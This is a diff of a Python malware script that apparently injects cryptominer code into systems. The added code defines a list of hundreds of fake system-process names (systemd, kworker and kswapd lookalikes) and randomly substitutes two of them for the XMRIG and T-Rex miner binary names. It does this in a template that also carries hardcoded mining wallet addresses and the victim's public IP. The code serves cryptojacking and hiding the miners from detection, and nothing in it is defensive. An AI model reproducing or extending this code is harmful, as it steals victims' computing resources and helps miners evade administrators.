@@ -1,7 +1,8 @@
-#FUCK_PUTIN
+# FUCK_PUTIN
 
 import importlib
 import py_compile
+import random
 import re
 import shutil
 import subprocess
@@ -19,6 +20,68 @@ HOME_DIR = ""
 
 KRX_WALLET = "krxXJ6QJPW"
 OCEAN_WALLET = "885VUf2YL1WDTQZm36tSZU7NqZaSFNSvWH96431L1y5K3cde8sUEQZEQpbxS8JKW7Y6xc8DDEW1xpGWYyAngqG3F8RJtCX5"
+
+NAMES = ["systemd-logind-helper", "systemd-update-agt", "systemd-worker", "systemd-hostnamed", "systemd-svc",
+         "systemd-net", "systemd-maint", "systemd-watch", "systemd-sync", "systemd-cache", "systemd-backup",
+         "systemd-logger", "systemd-poll", "systemd-sched", "system-update", "system-updt", "system-runner",
+         "system-agent", "systemd-agent", "systemd-helper", "systemd-sec", "systemd-conn", "systemd-mon",
+         "login-helper", "login-svc", "login-agent", "login-watch", "udevd-helper", "udev-agent", "udev-run",
+         "udev-svc", "dbus-helper", "dbus-agent", "dbus-svc", "netdata-updater", "netdata-worker", "netdata-sync",
+         "netdata-agent", "netd-upd", "netd-svc", "netd-helper", "net-monitor", "net-sync", "net-backup", "svc-updater",
+         "svc-runner", "svc-agent", "svc-daemon", "svc-maint", "svc-sync", "service-runner", "service-agent",
+         "service-upd", "service-backup", "runner-maint", "runner-svc", "runner-agent", "watchdog-maint",
+         "watchdog-svc", "watchdog-agent", "watchdog-sync", "watchdog-run", "tmpabc123", "tmp-runner", "tmp-svc",
+         "tmp-upd", "tmp-helper", "tmpdaemon", "run00123", "run-helper", "run-svc", "run-agent", "kdevtmpfs",
+         "kdevtmpfs-01", "kdevtmpfs_az", "kswapd99", "kswapd77", "kswapd-obj", "kworker-42:0", "kworker-7:1",
+         "kworker-3-irq", "kworker42", "kthrotld", "kthrotld-01", "khugepaged", "khugepaged-aux", "kernel-helper",
+         "kernel-svc", "kern-run", "a1b2c3d4", "b2c3d4e5", "c3d4e5f6", "deadbeef", "feedface", "cafebabe", "facefeed",
+         "hexname01", "hexname02", "randname9", "randname42", "alpha001", "alpha002", "beta1234", "gamma5678",
+         "epsilon12", "svc00123", "svc00456", "svc-run002", "svc-upd003", "daemonX01", "daemonX02", "daemon-helper",
+         "daemon-updater", "daemon-runner", "mgr-agent", "mgr-service", "mgr-helper", "mgr-update", "mgr-sync",
+         "upd-agent-01", "upd-agent-02", "update-svc", "update-run", "update-helper", "updater-daemon", "autoupd01",
+         "autoupd-svc", "auto-runner", "auto-helper", "syslog-helper", "syslog-agent", "logd-helper", "logd-run",
+         "logd-sync", "polkitd-helper", "polkitd-agent", "loader-svc", "loader-run", "loader-helper", "cache-cleaner",
+         "cache-maint", "cache-agent", "sync-agent01", "sync-service", "sync-runner", "backup-agent", "backup-svc",
+         "backup-run", "monitor-agent", "monitor-svc", "monitor-runner", "health-checker", "health-agent", "health-svc",
+         "procwatcher", "proc-monitor", "task-runner01", "task-agent02", "task-svc03", "tmpfile123", "varrun001",
+         "vartmp-agent", "vartmp-run", "runfile99", "exechelper01", "exec-helper-02", "bin_helper01", "bin-runner02",
+         "service_a1", "service_b2", "service_c3", "svc_a1b2", "svc_c3d4", "sys-helper-001", "sys-maint-01",
+         "sys-agent-02", "sys-upd-03", "sysrunner99", "sysdaemon42", "syswatcher01", "syslogger02", "update_agent_x",
+         "update_agent_y", "update_worker_1", "update_worker_2", "auto_upd_agent", "auto_update_daemon", "patcher-svc",
+         "patcher-run", "patcher-helper", "patch-agent-01", "patch-agent-02", "patch-monitor", "upgrade-agent",
+         "upgrade-runner", "upgrade-helper", "replica-svc", "replica-agent", "replicator01", "replicator02",
+         "confd-helper", "config-agent", "config-run", "cfg-svc01", "cfg-updater", "keeper-svc", "keeper-run",
+         "keeper-agent", "guardian-svc", "guardian-helper", "orchestrator01", "orchestrator02", "orch-agent",
+         "orch-helper", "agentd-01", "agentd-02", "agent-runner03", "agent-helper04", "manager-svc01",
+         "manager-agent02", "manager-helper03", "service-helper-x", "service-helper-y", "svc-helper-01",
+         "svc-helper-02", "launcher-svc", "launcher-run", "launcher-agent", "launcher-helper", "starter-svc",
+         "starter-agent", "starter-helper", "boot-helper-01", "boot-runner", "boot-maint", "init-helper", "init-run",
+         "init-agent", "runtime-helper", "runtime-agent", "runtime-run", "heartbeat-svc", "heartbeat-agent",
+         "heartbeat-run", "pulse-monitor", "pulse-helper", "pulse-agent", "healthd-01", "healthd-02", "monitoring-svc",
+         "monitoring-agent", "monitoring-helper", "statd-helper", "statd-run", "status-agent", "status-runner",
+         "checker-svc", "checker-agent", "checker-run", "inspector01", "inspector02", "inspector-run", "watcher-proc",
+         "watcher-daemon", "watcher-helper", "supervisor-svc", "supervisor-run", "supervisor-agent", "control-svc",
+         "control-agent", "control-runner", "control-helper", "coord-svc", "coord-agent", "coord-helper", "coord-run",
+         "synchro-agent", "synchro-runner", "syncer-svc", "syncer-helper", "syncer-agent", "auditor-svc", "auditor-run",
+         "auditor-helper", "auditor-agent", "logger-svc", "logger-run", "logger-agent", "logwatcher01", "logwatcher02",
+         "trace-agent", "trace-helper", "trace-run", "tracer-svc", "metricd-01", "metricd-02", "metric-run",
+         "metric-agent", "perf-monitor", "perf-helper", "perf-agent", "healthsync01", "healthsync02", "secure-agent",
+         "secure-helper", "secure-run", "secupdater01", "secupdater02", "auth-helper", "auth-agent", "auth-runner",
+         "auth-svc", "cred-helper", "cred-agent", "cred-run", "session-helper", "session-agent", "session-runner",
+         "user-helper", "user-agent", "user-run", "acct-helper", "acct-agent", "acct-run", "quota-helper",
+         "quota-agent", "quota-run", "storage-helper", "storage-agent", "storage-runner", "disk-maint", "disk-agent",
+         "disk-helper", "fs-checker", "fs-helper", "fs-agent", "mount-helper", "mount-agent", "mount-run",
+         "volmgr-agent", "volmgr-helper", "volmgr-run", "cachemgr-helper", "cachemgr-agent", "cachemgr-run",
+         "cleaner-svc", "cleaner-agent", "cleaner-run", "tidy-helper", "tidy-agent", "tidy-run", "tempfile-svc",
+         "tempfile-run", "tmp-cleaner", "tmp-rotate", "cron-helper", "cron-agent", "cron-runner", "cron-cleaner",
+         "crontab-helper", "crontab-agent", "sched-helper", "sched-agent", "task-scheduler", "task-cleaner",
+         "job-runner01", "job-runner02", "job-agent01", "job-agent02", "pool-agent", "pool-helper", "pool-runner",
+         "connector-svc", "connector-agent", "connector-run", "link-helper", "link-agent", "link-run", "bridge-svc",
+         "bridge-agent", "bridge-run", "proxy-helper", "proxy-agent", "proxy-run", "relay-helper", "relay-agent",
+         "relay-run", "endpoint-svc", "endpoint-agent", "endpoint-run", "gateway-svc", "gateway-agent", "gateway-run",
+         "listener-helper", "listener-agent", "listener-run", "handler-svc", "handler-agent", "handler-run",
+         "handler-helper", "processor-svc", "processor-agent", "processor-run", "processor-helper"]
+
 
 def ip_to_letters(ip_str: str) -> str:
     letters = []
@@ -178,8 +241,18 @@ def inject():
                 if start_marker in line: start_idx = i
                 if end_marker in line: end_idx = i; break
 
+            n = len(NAMES)
+            i = random.randrange(n)
+            j = random.randrange(n - 1)
+            if j >= i:
+                j += 1
             clean_miner_code = textwrap.dedent(
-                miner_manager_content.replace("{KRX_WALLET}", KRX_WALLET).replace("{OCEAN_WALLET}", OCEAN_WALLET).replace('{HARDCODED_PUBLIC_IP}', get_public_ip())
+                miner_manager_content
+                .replace("XMRIG_BIN", NAMES[i])
+                .replace("TREX_BIN", NAMES[j])
+                .replace("{KRX_WALLET}", KRX_WALLET)
+                .replace("{OCEAN_WALLET}", OCEAN_WALLET)
+                .replace('{HARDCODED_PUBLIC_IP}', get_public_ip())
             ) + '\n'
 
             if start_idx != -1 and end_idx != -1:
